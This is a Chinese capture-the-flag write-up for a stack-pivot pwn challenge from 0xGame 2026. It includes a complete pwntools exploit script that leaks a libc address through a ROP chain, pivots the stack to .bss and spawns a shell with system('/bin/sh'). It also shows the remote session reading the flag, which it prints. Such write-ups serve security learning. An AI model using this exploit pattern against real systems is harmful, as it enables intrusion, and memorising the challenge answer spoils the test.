# 跳一跳？

> "你知道吗，程序其实很蠢的"
>
> "经过上一周的训练，你应该已经成为了大手子了吧"
>
> "找到栈上特殊的位置，把程序劫持到你想要的地方吧"
>
> "什么叫我只有16字节溢出？"
>
> "跑了跑了......"

这题考栈迁移。第一步把 payload 写进 .bss ，`readn` 要写整整 0x200 = 256 字节，写不了这么多的话后面就随便填充。第二步就要触发 pivot ，把原 stack 上的 buffer 用 padding 填了，改掉 saved RBP 并给一个 leave ，从而 pivot 到 .bss 上。那么第一步布置的 ROP 应该泄露 puts 地址，算出 libc base 、`system` 以及 `/bin/sh` 的 offset 。等第二步泄露完就跳回 `vuln` 开头第一步，在 .bss 上拿到 shell 。

脚本如下：

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"

io = remote("nc1.ctfplus.cn", 34215)

pop_rdi = 0x40123f
leave = 0x40129a
retn = 0x40101a

plt_read = 0x401050
plt_puts = 0x401040
vuln = 0x401244

global_buf = 0x4047a0
got_puts = 0x404020

io.sendafter(
    b"Step 1: Send your ROP payload to the safe house:\n",
    flat(
        retn, # leave 消耗

        pop_rdi, got_puts,
        plt_puts,

        vuln
    ).ljust(0x200, b"A")
)

io.sendafter(
    b"Step 2: Trigger the pivot:\n",
    flat(
        b"A" * 16,
        global_buf,
        leave
    )
)

puts = u64(io.recv(6) + b'\x00\x00')

puts_offset = 0x80e10
libc_base = puts - puts_offset
system_offset = 0x50d70
system = libc_base + system_offset
binsh_offset = 0x1d8678
binsh = libc_base + binsh_offset

io.sendafter(
    b"Step 1: Send your ROP payload to the safe house:\n",
    flat(
        retn, # leave 消耗
        retn,

        pop_rdi, binsh,
        system
    ).ljust(0x200, b"A")
)

io.interactive()
```

运行：

```bash
(sage) scetayh@yuprae-gentoo ~/Projects/0xgame2026-writeups/week2/pwn/2 $ python3 solve.py 
[+] Opening connection to nc1.ctfplus.cn on port 34215: Done
[*] Switching to interactive mode
$ ls
flag
ld-linux-x86-64.so.2
libc.so.6
pwn
$ cat flag
0xGame{51c181ad-09ed-4d25-baf6-bab47c37c4f4}
```

得到 flag 为 `0xGame{51c181ad-09ed-4d25-baf6-bab47c37c4f4}` 。